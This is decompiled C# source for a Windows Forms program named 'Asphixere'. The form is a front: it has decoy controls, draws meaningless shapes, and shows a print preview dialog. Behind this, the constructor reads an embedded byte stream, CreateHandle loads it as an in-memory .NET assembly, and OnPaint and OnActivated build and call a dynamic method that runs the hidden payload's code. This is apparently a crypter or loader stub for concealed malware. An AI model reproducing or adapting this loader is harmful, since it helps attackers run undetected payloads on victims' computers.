using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Reflection;
using System.Reflection.Emit;
using System.Windows.Forms;

namespace Asphixere;

public class Form1 : Form
{
	private delegate object RUN(Type T);

	private IContainer icontainer_0;

	private SerialPort serialPort_0;

	private Process process_0;

	private Timer timer_0;

	private PrintPreviewDialog printPreviewDialog_0;

	private List<ushort> list_0;

	private List<ListView> list_1;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		icontainer_0 = new Container();
		new ComponentResourceManager(typeof(Form1));
		serialPort_0 = new SerialPort(icontainer_0);
		process_0 = new Process();
		timer_0 = new Timer(icontainer_0);
		printPreviewDialog_0 = new PrintPreviewDialog();
		((Control)this).SuspendLayout();
		process_0.StartInfo.LoadUserProfile = false;
		process_0.StartInfo.Password = null;
		process_0.StartInfo.StandardErrorEncoding = null;
		process_0.StartInfo.StandardOutputEncoding = null;
		process_0.SynchronizingObject = (ISynchronizeInvoke?)this;
		printPreviewDialog_0.set_AutoScrollMargin(new Size(0, 0));
		printPreviewDialog_0.set_AutoScrollMinSize(new Size(0, 0));
		((Form)printPreviewDialog_0).set_ClientSize(new Size(400, 300));
		printPreviewDialog_0.set_Enabled(true);
		printPreviewDialog_0.set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(685, 404));
		((Control)this).ResumeLayout(false);
	}

	public Form1(UnmanagedMemoryStream UMS)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		((Control)this).SetStyle((ControlStyles)8192, true);
		((Control)this).SetStyle((ControlStyles)2, true);
		list_1 = new List<ListView>(1);
		list_1.Add(new ListView());
		list_1.Add(new ListView());
		try
		{
			int num = (int)UMS.Length;
			list_0 = new List<ushort>(num);
			for (int i = 0; i < num; i++)
			{
				list_0.Add((ushort)UMS.ReadByte());
			}
			UMS.Close();
		}
		catch
		{
			throw new ExecutionEngineException();
		}
		method_0();
		((Form)this).add_Load((EventHandler)Form1_Load);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((Control)this).Invalidate();
			Bitmap val = new Bitmap(1, 1);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			((Control)this).OnPaint(new PaintEventArgs(val2, ((Control)this).get_ClientRectangle()));
			((Form)this).OnActivated(new EventArgs());
			((Form)printPreviewDialog_0).ShowDialog();
		}
		catch
		{
			((Form)this).Close();
		}
	}

	protected override void CreateHandle()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ListViewItem val = new ListViewItem(new ListViewGroup());
		val.set_Tag((object)Assembly.Load(method_1(list_0.ToArray())).GetTypes());
		list_1[1].get_Items().Add(val);
		((Form)this).CreateHandle();
	}

	protected override void OnPaint(PaintEventArgs e)
	{
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		e.get_Graphics().Clear(Color.Chartreuse);
		MethodInfo[] methods = typeof(Type).GetMethods();
		MethodInfo[] methods2 = typeof(MethodBase).GetMethods();
		if (list_1[0].get_Items().get_Count() <= 0)
		{
			_ = (Type[])list_1[1].get_Items().get_Item(0).get_Tag();
			DynamicMethod dynamicMethod = new DynamicMethod(typeof(Program).GetMethods()[0].Name, typeof(object), new Type[1] { typeof(Type) }, restrictedSkipVisibility: true);
			ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
			iLGenerator.Emit(OpCodes.Ldarg_0);
			iLGenerator.EmitCall(OpCodes.Callvirt, methods[50], null);
			iLGenerator.Emit(OpCodes.Ldc_I4_0);
			iLGenerator.Emit(OpCodes.Ldelem_Ref);
			iLGenerator.Emit(OpCodes.Ldnull);
			iLGenerator.Emit(OpCodes.Ldc_I4_0);
			iLGenerator.Emit(OpCodes.Newarr, typeof(object));
			iLGenerator.EmitCall(OpCodes.Callvirt, methods2[13], null);
			iLGenerator.Emit(OpCodes.Ret);
			ListViewItem val = new ListViewItem(new ListViewGroup());
			val.set_Tag((object)dynamicMethod.CreateDelegate(typeof(RUN)));
			list_1[0].get_Items().Add(val);
		}
		e.get_Graphics().DrawLine(new Pen(Color.FromArgb(6, 21, 240)), 9, 0, 240, 60);
		e.get_Graphics().DrawPie(Pens.get_BlanchedAlmond(), ((Control)this).get_ClientRectangle(), 10f, 50f);
	}

	protected override void OnActivated(EventArgs e)
	{
		((RUN)list_1[0].get_Items().get_Item(0).get_Tag())(((Type[])list_1[1].get_Items().get_Item(0).get_Tag())[0]);
		throw new Exception();
	}

	private byte[] method_1(ushort[] ushort_0)
	{
		byte[] array = new byte[ushort_0.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)ushort_0[i];
		}
		return array;
	}
}
